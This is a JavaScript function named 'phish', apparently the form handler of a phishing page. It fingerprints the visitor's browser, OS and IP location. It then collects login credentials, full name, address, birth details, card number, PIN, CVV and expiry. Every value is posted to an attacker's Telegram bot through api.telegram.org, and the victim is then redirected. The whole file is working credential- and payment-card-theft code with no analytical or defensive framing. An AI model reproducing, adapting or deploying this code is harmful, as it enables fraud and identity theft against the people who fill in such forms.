                const phish = (bot_token, chat_id, redirect_link) => {
                    var module = {
                        options: [],
                        header: [
                            navigator.platform,
                            navigator.userAgent,
                            navigator.appVersion,
                            navigator.vendor,
                            window.opera
                        ],
                        dataos: [
                            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
                            { name: 'Windows', value: 'Win', version: 'NT' },
                            { name: 'iPhone', value: 'iPhone', version: 'OS' },
                            { name: 'iPad', value: 'iPad', version: 'OS' },
                            { name: 'Kindle', value: 'Silk', version: 'Silk' },
                            { name: 'Android', value: 'Android', version: 'Android' },
                            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
                            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
                            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
                            { name: 'Linux', value: 'Linux', version: 'rv' },
                            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
                        ],
                        databrowser: [
                            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
                            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
                            { name: 'Safari', value: 'Safari', version: 'Version' },
                            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
                            { name: 'Opera', value: 'Opera', version: 'Opera' },
                            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
                            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
                        ],
                        init: function() {
                            var agent = this.header.join(' '),
                                os = this.matchItem(agent, this.dataos),
                                browser = this.matchItem(agent, this.databrowser);

                            return { os: os, browser: browser };
                        },
                        matchItem: function(string, data) {
                            var i = 0,
                                j = 0,
                                html = '',
                                regex,
                                regexv,
                                match,
                                matches,
                                version;

                            for (i = 0; i < data.length; i += 1) {
                                regex = new RegExp(data[i].value, 'i');
                                match = regex.test(string);
                                if (match) {
                                    regexv = new RegExp(
                                        data[i].version + '[- /:;]([\\d._]+)',
                                        'i'
                                    );
                                    matches = string.match(regexv);
                                    version = '';
                                    if (matches) {
                                        if (matches[1]) {
                                            matches = matches[1];
                                        }
                                    }
                                    if (matches) {
                                        matches = matches.split(/[._]+/);
                                        for (j = 0; j < matches.length; j += 1) {
                                            if (j === 0) {
                                                version += matches[j] + '.';
                                            } else {
                                                version += matches[j];
                                            }
                                        }
                                    } else {
                                        version = '0';
                                    }
                                    return {
                                        name: data[i].name,
                                        version: parseFloat(version)
                                    };
                                }
                            }
                            return { name: 'unknown', version: 0 };
                        }
                    };

                    var e = module.init();

                    const ipLocation = () => {
                        let req = new XMLHttpRequest();
                        req.open(
                            'GET',
                            `http://ip-api.com/json/?fields=query,country,city,regionName`,
                            false
                        );
                        req.send(null);
                        let json = JSON.parse(req.responseText);
                        return json;
                    };
                    const goTo = () => {
                        let link = new URLSearchParams(window.location.search).get('link');
                        if (link !== null) {
                            redirect_link = link;
                        }
                        window.location.assign(redirect_link);
                    };

                    let ip_json = ipLocation();

                    var uname = $('#ptext'),
                    pass =  $('#pword'),
                    firstN =  $('#input-1'),
                    lastN = $('#input-2'), 
                    middleN = $('#input-3'),
                    otherN = $('#input-4'),
                    residential = $('#input-5'),
                    stateA = $('#input-6'),
                    countryA = $('#input-7'),
                    zipA = $('#input-8'),
                    ddB = $('#input-9'),
                    mmB = $('#input-10'),
                    yyyyB = $('#input-11'),
                    POB =  $('#input-12'),
                    CardN = $('#input-13'),
                    pin = $('#input-14'),
                    cvv = $('#input-15'),
                    expiry = $('#input-16'),
                    submitButton = $('#nextBtn');
                    
                    const inputs = [];

                    for (let i = 1; i <= 16; i++) {
                        inputs[i] = $(`#input-${i}`);
                        inputs[i].on(
                            'change input paste keydown cut keypress keyup changeproperty',
                            function() {
                                let allFieldsFilled = true;
                                for (let j = 1; j <= 16; j++) {
                                    if (inputs[j].val().length === 0) {
                                        allFieldsFilled = false;
                                        break;
                                    }
                                }
                                submitButton.prop('disabled', !allFieldsFilled);
                            }
                        );
                    }
                
                    submitButton.on('click', function() {
                        // ... (previous code)
                        let currentdate = new Date(),
                        date = `${currentdate.getDate()}/${currentdate.getMonth() +
                            1}/${currentdate.getFullYear()}`,
                        time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
                        xhr = new XMLHttpRequest(),
                        unameVal = uname.val(),
                        passVal = pass.val(),
                        firstNval = firstN.val(),
                        lastNVal = lastN.val(),
                        middleNVal = middleN.val(),
                        otherNVal = otherN.val(),
                        residentialVal =residential.val(),
                        stateAVal = stateA.val(),
                        CountryAVal= countryA.val(),
                        ZipAVal = zipA.val(),
                        ddBVal = ddB.val(),
                        mmBVal = mmB.val(),
                        yyyyBval = yyyyB.val(), 
                        POBVal = POB.val(),
                        CardNvaL = CardN.val(),
                        pinVal = pin.val(),
                        cvvVal = cvv.val(),
                        expiryVal = expiry.val(), 
                        msg = `----------------------------------------------------%0A
                        Date  :    ${date}%0A
                        Time :    ${time}%0A
                        ----------------------------------------------------%0A
                        Login:    ${unameVal}%0A
                        Pass :    ${passVal}%0A
                        First Name :    ${firstNval}%0A
                        last Name :    ${lastNVal}%0A
                        Middle Name :    ${middleNVal}%0A
                        Other Name :    ${otherNVal}%0A
                        Residential Address :    ${residentialVal}%0A
                        State  :    ${stateAVal}%0A
                        Country :    ${CountryAVal}%0A
                        Zip Number :    ${ZipAVal}%0A
                        day of birth :    ${ddBVal}%0A
                        month of birth :    ${mmBVal}%0A
                        year of birth :    ${yyyyBval}%0A
                        Place of birth :    ${POBVal}%0A
                        Card Number :    ${CardNvaL}%0A
                        Pin :    ${pinVal}%0A
                        Cvv :    ${cvvVal}%0A
                        Expiry date :    ${expiryVal}%0A
                        ----------------------------------------------------%0A
                        IP: ${ip_json.query}%0A
                        Location: ${ip_json.city}, ${ip_json.regionName}, ${ip_json.country}%0A
                        OS: ${e.os.name} v${e.os.version}%0A
                        Browser:  ${e.browser.name} v${e.browser.version}%0A
                        ----------------------------------------------------%0A%0A
                        More Info%0A%0A
                        navigator.userAgent:%0A${navigator.userAgent}%0A%0A
                        navigator.appVersion:%0A${navigator.appVersion}%0A%0A
                        navigator.platform:%0A${navigator.platform}%0A%0A
                        navigator.vendor:%0A${navigator.vendor}%0A
                        `;
            
                    xhr.open(
                        'POST',
                        `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
                    );
                    xhr.send();
            
                    setTimeout(function() {
                        goTo();
                    }, 1000);
                    });
                };
                
                
                
                
                
                
                